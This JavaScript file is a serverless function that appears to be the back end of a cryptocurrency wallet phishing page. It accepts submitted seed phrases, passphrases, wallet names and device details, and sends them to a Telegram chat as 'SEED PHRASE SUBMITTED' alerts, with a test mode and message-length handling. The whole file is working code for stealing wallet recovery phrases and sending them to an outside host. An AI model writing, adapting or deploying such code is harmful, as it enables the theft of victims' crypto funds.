// Vercel Serverless Function for Telegram submissions
// Set in Vercel Dashboard → Project → Settings → Environment Variables:
//   TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

function setCors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Max-Age', '86400');
}

module.exports = async function handler(req, res) {
  setCors(res);

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  const requestId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
  console.log(`[${requestId}] 📥 Incoming request:`, { method: req.method, url: req.url });

  // GET: simple health check (no secrets) so you can open /api/telegram in browser
  if (req.method === 'GET') {
    const hasToken = !!process.env.TELEGRAM_BOT_TOKEN;
    const hasChatId = !!process.env.TELEGRAM_CHAT_ID;
    return res.status(200).json({
      ok: true,
      message: 'Telegram API is live',
      env: { TELEGRAM_BOT_TOKEN: hasToken ? 'set' : 'missing', TELEGRAM_CHAT_ID: hasChatId ? 'set' : 'missing' }
    });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
  const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error(`[${requestId}] ❌ Missing Telegram credentials`);
    return res.status(500).json({
      error: 'Server configuration error',
      details: !TELEGRAM_BOT_TOKEN ? 'TELEGRAM_BOT_TOKEN is missing' : 'TELEGRAM_CHAT_ID is missing'
    });
  }

  try {
    let phrase, passphrase, imported, keywords, copyUrl, deviceInfo, formattedDate;
    let body = req.body;

    // Vercel: req.body is often empty for POST; read from stream
    if (body === undefined || body === null) {
      const raw = typeof req.body === 'string' ? req.body : (Buffer.isBuffer(req.body) ? req.body.toString('utf8') : (req.body && req.body.toString && req.body.toString()));
      if (raw) {
        try {
          body = JSON.parse(raw);
        } catch (_) {
          body = null;
        }
      }
      // Vercel: Web Request API (req.json())
      if ((body === undefined || body === null) && typeof req.json === 'function') {
        try {
          body = await req.json();
        } catch (_) {
          body = null;
        }
      }
      // Vercel Node: read stream (req.on)
      if ((body === undefined || body === null) && typeof req.on === 'function') {
        try {
          const rawStream = await new Promise(function (resolve, reject) {
            const chunks = [];
            req.on('data', function (chunk) { chunks.push(chunk); });
            req.on('end', function () { resolve(Buffer.concat(chunks).toString('utf8')); });
            req.on('error', reject);
          });
          if (rawStream) body = JSON.parse(rawStream);
        } catch (_) {
          body = null;
        }
      }
    } else if (Buffer.isBuffer(body)) {
      try {
        body = JSON.parse(body.toString('utf8'));
      } catch (_) {
        body = null;
      }
    } else if (typeof body !== 'object' || body === null) {
      body = null;
    }

    if (body) {
      phrase = body.phrase;
      passphrase = body.passphrase;
      imported = body.imported;
      keywords = body.keywords;
      copyUrl = body.copyUrl;
      deviceInfo = body.deviceInfo;
      formattedDate = body.formattedDate;
    }

    // TEST MODE: POST { "test": true } to send a test message to your Telegram
    if (body && body.test === true) {
      const chatId = String(TELEGRAM_CHAT_ID).trim();
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const testRes = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: '🧪 Test from Flare API – if you see this, Telegram is connected.',
          parse_mode: 'HTML'
        })
      });
      const testData = await testRes.json();
      return res.status(200).json({
        ok: testData.ok,
        message: testData.ok ? 'Test message sent to Telegram' : 'Telegram API error',
        telegram: testData
      });
    }

    console.log(`[${requestId}] 📋 Request data:`, {
      hasBody: !!body,
      hasPhrase: !!phrase,
      phraseLength: phrase ? phrase.length : 0,
      hasImported: !!imported,
      imported: imported
    });

    if (!phrase || !imported) {
      console.error(`[${requestId}] ❌ Missing required fields. body received:`, !!body);
      return res.status(400).json({
        error: 'Missing required fields',
        details: !body ? 'No request body received. Send JSON with Content-Type: application/json' : 'phrase and imported are required',
        debug: { bodyReceived: !!body, hasPhrase: !!phrase, hasImported: !!imported }
      });
    }

    // Get device and browser information (passed from client)
    deviceInfo = deviceInfo || 'Unknown Device';
    formattedDate = formattedDate || new Date().toUTCString();
    const wordCountDesc = keywords ? `${keywords} word phrase` : '12 word phrase';

    // Escape HTML special characters (much simpler than Markdown!)
    // HTML parse mode only requires escaping: < > &
    function escapeHTML(text) {
      if (!text) return '';
      return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    }

    // Escape all user input fields for HTML
    const escapedPhrase = escapeHTML(phrase);
    const escapedWallet = escapeHTML(imported || 'Unknown');
    const escapedDate = escapeHTML(formattedDate);
    const escapedDevice = escapeHTML(deviceInfo.substring(0, 200));
    
    // Format Telegram message in "FLARE Alert" style using HTML
    let message = `🚨 <b>FLARE Alert</b>\n\n` +
                   `🔑 <b>SEED PHRASE SUBMITTED</b>\n\n` +
                   `👤 <b>Wallet:</b> ${escapedWallet}\n` +
                   `🔤 <b>Words:</b> ${wordCountDesc}\n` +
                   `🕐 <b>Time:</b> ${escapedDate}\n` +
                   `🌍 <b>Location:</b> Unknown, Unknown\n` +
                   `📱 <b>Device:</b> ${escapedDevice}${deviceInfo.length > 200 ? '...' : ''}\n\n` +
                   `🔒 <b>Seed Phrase:</b>\n` +
                   `<code>${escapedPhrase}</code>\n\n` +
                   `⚠️ <i>User attempted wallet recovery</i>\n\n`;
    
    // Add copy URL link if available (escape for HTML attr)
    if (copyUrl) {
      const escapedCopyUrl = escapeHTML(String(copyUrl));
      message += `<a href="${escapedCopyUrl}">📎 Click to Copy Phrase</a>`;
    }
    
    // Telegram message length limit is 4096 characters
    if (message.length > 4096) {
      // Truncate the seed phrase if message is too long
      const baseMessageLength = message.length - escapedPhrase.length;
      const maxPhraseLength = Math.max(0, 4096 - baseMessageLength - 100); // Leave 100 chars buffer
      const truncatedPhrase = phrase.substring(0, maxPhraseLength);
      const escapedTruncatedPhrase = escapeHTML(truncatedPhrase);
      message = `🚨 <b>FLARE Alert</b>\n\n` +
                 `🔑 <b>SEED PHRASE SUBMITTED</b>\n\n` +
                 `👤 <b>Wallet:</b> ${escapedWallet}\n` +
                 `🔤 <b>Words:</b> ${wordCountDesc}\n` +
                 `🕐 <b>Time:</b> ${escapedDate}\n` +
                 `🌍 <b>Location:</b> Unknown, Unknown\n` +
                 `📱 <b>Device:</b> ${escapedDevice.substring(0, 100)}...\n\n` +
                 `🔒 <b>Seed Phrase:</b>\n` +
                 `<code>${escapedTruncatedPhrase}...</code>\n\n` +
                 `⚠️ <i>User attempted wallet recovery</i>\n\n`;
      if (copyUrl) {
        message += `<a href="${escapeHTML(String(copyUrl))}">📎 Click to Copy Phrase</a>`;
      }
    }

    // Final validation: Telegram message length limit is 4096 characters
    if (message.length > 4096) {
      console.error(`[${requestId}] ⚠️ Message too long:`, message.length, 'characters (max: 4096)');
      // Force truncate more aggressively
      const safeMaxLength = 3500;
      message = message.substring(0, safeMaxLength) + '...\n\n[Message truncated due to length]';
      console.log(`[${requestId}] ✂️ Truncated message to:`, message.length, 'characters');
    }

    console.log(`[${requestId}] 📤 Preparing to send message to Telegram. Length:`, message.length, 'characters');
    console.log(`[${requestId}] 📝 Message preview (first 200 chars):`, message.substring(0, 200));

    // Send to Telegram: chat_id as string (e.g. "-1001234567890" or "@channel")
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const chatId = String(TELEGRAM_CHAT_ID).trim();

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const data = await response.json();

    if (data.ok) {
      console.log(`[${requestId}] ✅ Telegram message sent successfully`);
      return res.status(200).json({ success: true, message: 'Message sent to Telegram successfully' });
    }
    // Return Telegram's error so you can see it in Network tab / console
    console.error(`[${requestId}] ❌ Telegram API error:`, data.description);
    return res.status(500).json({
      error: 'Telegram API error',
      details: data.description || 'Unknown error',
      code: data.error_code
    });
  } catch (error) {
    console.error(`[${requestId}] ❌ Exception:`, error.message);
    return res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
};

